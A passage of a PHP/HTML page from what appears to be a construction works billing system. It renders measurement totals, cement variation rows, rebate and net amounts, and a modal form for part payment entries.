//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
$total_amt_item = $slm_amount_item + $dpm_amount_item;
?>
	<tr border='1' class="label" bgcolor="#FFFFFF">
		<td  align='left' width='' class='' style="border-bottom-color:#046CA8">&nbsp;</td>
		<td  align='right' width='' class='label' style="border-bottom-color:#046CA8">TOTAL</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo $rate; ?>
		</td>
		<td  align='left' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo $unit; ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo number_format($total_amt_item, 2, '.', ''); ?>
		</td>
		<td  align='left' width='' class='' style="border-bottom-color:#046CA8">&nbsp;</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">
		<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#046CA8">&nbsp;</td>
	</tr>
	<?php  $rowcount++; ?>
<!--------------------------------------- Cement Variation Starts------------------->
	
<?php
				
				if(in_array($subdivid,$CVItemArr)){
					$CVRate 		= $CemVarMasterArr[$subdivid][0];
					$CvDiffence 	= $CemVarMasterArr[$subdivid][1];
					
					$SLMCvVarQty	= round($SLMCemVarQtyArr[$subdivid],$decimal);
					$DPMCvVarQty 	= round($DPMCemVarQtyArr[$subdivid],$decimal);
					$UPTOCvVarQty	= round(($SLMCvVarQty + $DPMCvVarQty),$decimal);
					
					$SLMCvVar		= round(($SLMCvVarQty * $CvDiffence),$decimal);
					$DPMCvVar 		= round(($DPMCvVarQty * $CvDiffence),$decimal);
					$UPTOCvVar		= round(($SLMCvVar + $DPMCvVar),$decimal);
					
					$SLMCvVarAmt 	= round($SLMCemVarArr[$subdivid],2);
					$DPMCvVarAmt 	= round($DPMCemVarArr[$subdivid],2);
					$UPTOCvVarAmt 	= round(($SLMCvVarAmt + $DPMCvVarAmt),2);
					
					$slm_amount_item = $slm_amount_item + $SLMCvVarAmt;
					$dpm_amount_item = $dpm_amount_item + $DPMCvVarAmt;
					$total_amt_item = $total_amt_item + $UPTOCvVarAmt;
					$rowcount++; $Line++;
					
?>

				<tr border='1' class="labelprint" bgcolor="">
					<td  align='center' width='' class=''>CV<?php echo $subdivname; ?></td>
					<td  align='right' width='' class=''> Cement Variation (<?php echo $CvDiffence; ?>)</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($UPTOCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo $CVRate; ?>
					</td>
					<td  align='left' width='' class=''>
					kg<?php //echo $unit; ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($UPTOCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='left' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($DPMCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($DPMCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($SLMCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($SLMCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
				</tr>	
<?php
				}
?>	
	
<!--------------------------------------- Cement Variation Ends------------------->
	
	<?php if($i != count($subdivisionlist)-1){ ?>
	<tr bgcolor="#d4d8d8" style="height:1px"><td colspan="13" style="border-top:1px solid #046CA8; border-bottom:1px solid #046CA8;"></td></tr>
	<?php } ?>
	<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
	<?php
	$color_var++; $table_group_row++;
	$OverAllSlmAmount 		= $OverAllSlmAmount		+	$slm_amount_item; 
	$OverAllDpmAmount 		= $OverAllDpmAmount		+	$dpm_amount_item; 
	$OverAllSlmDpmAmount 	= $OverAllSlmDpmAmount	+	$total_amt_item;
}
	
	$SlmRebateAmount 		=  $OverAllSlmAmount 	* 	$overall_rebate_perc /100;
	$DpmRebateAmount 		=  $OverAllDpmAmount 	* 	$overall_rebate_perc /100;
	$SlmDpmRebateAmount 	=  $OverAllSlmDpmAmount * 	$overall_rebate_perc /100;
	
	$SlmNetAmount 			= $OverAllSlmAmount		-	$SlmRebateAmount; 
	$DpmNetAmount 			= $OverAllDpmAmount		-	$DpmRebateAmount; 
	$SlmDpmNetAmount 		= $OverAllSlmDpmAmount	-	$SlmDpmRebateAmount;

?>
	<tr class="label" style="border-top:2px solid #046CA8; border-left:2px solid #046CA8; border-right:2px solid #046CA8" bgcolor="">
		<td colspan="3" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<tr class="label" style=" border-left:2px solid #046CA8; border-right:2px solid #046CA8">
		<td colspan="3" align="right">Less Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<tr class="label" style="border-bottom:2px solid #046CA8; border-left:2px solid #046CA8; border-right:2px solid #046CA8" bgcolor="">
		<td colspan="3" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
</table>
<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />

<!--<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect"><input type="Submit" name="Submit" value="Submit" id="Submit" /> </div>
	<div class="btn_inside_sect"><input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> </div>
</div> -->
<!--<input type="button" name="btn_next" id="btn_next" class="BottomContent1" value="Next" onclick="Nextpage()" style="cursor:pointer;">-->
		<!-- modal content -->
		<div id="basic-modal-content">
			<div align="center" class="popuptitle gradientbg">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#046CA8" style="color:#FFFFFF">
						<td align="center" colspan="7" class="gradientbg">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						<input type="hidden" name="hid_dpm_qty" id="hid_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr id="dpmheadrow1">
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr id="dpmheadrow2">
						
						
						
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr id="dpmtotalrow">
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<!--<td colspan="6" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>-->
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr id="dpmremarksrow">
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" class="fontcolor2" rows="3" style=" width:519px; border:1px solid #EAEAEA;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#046CA8" style="color:#FFFFFF">
							<td align="center" colspan="5" class="gradientbg">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr id="slmheadrow">
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr id="slmtotalrow">
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id="slmremarksrow">
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" class="fontcolor2" rows="3" style="width:99%; border:1px solid #EAEAEA;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="gradientbg buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="gradientbg buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>
		<br/><br/>
<input type="Submit" name="Submit" value="Submit" id="Submit" class="BottomContent1" />
</form>
</body>
<link rel="stylesheet" href="dashboard/MyView/TreeLabelStyle.css">
<style>
	.BottomContent1{
		cursor:pointer;
		pointer-events:auto;
		background:#E3095A !important;
		background-color:#009ff4 !important;
		font-size:14px;
		letter-spacing:1px;
	}
	.BottomContent1:hover{
		background-color:#D50237 !important;
	}
	.bootstrap-dialog-title{
		font-family:Verdana, Arial, Helvetica, sans-serif;
	}
	.bootstrap-dialog-footer-buttons > .btn-default{
		padding:8px;
		font-family:Verdana, Arial, Helvetica, sans-serif;
		font-weight:bold;
		background-color:#D9044F;
		color:#FFFFFF;
		border:1px solid #D9044F;
		cursor:pointer;
		padding-left:10px;
		padding-right:10px;
		font-size:14px;
	}
	.bootstrap-dialog-footer-buttons > .btn-default:hover{
		background-color:#B1013F;
	}
	.rem-area{
		width:100%;
		border:1px solid #01ACFE;
		height:30px;
	}
</style>
</html>